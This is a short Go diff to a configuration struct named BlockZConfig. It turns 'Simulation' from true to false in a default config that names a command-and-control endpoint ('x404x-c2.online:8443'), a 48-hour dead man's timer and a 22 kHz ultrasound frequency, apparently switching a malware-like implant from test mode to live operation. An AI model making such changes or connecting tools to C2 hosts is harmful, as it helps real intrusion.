@@ -32,7 +32,7 @@ type BlockZConfig struct {
 func DefaultBlockZConfig() *BlockZConfig {
 	return &BlockZConfig{
 		Enabled:      true,
-		Simulation:   true,
+		Simulation:   false,
 		C2Endpoint:   "x404x-c2.online:8443",
 		DeadMansHours: 48,
 		UltrasoundFreq: 22000,
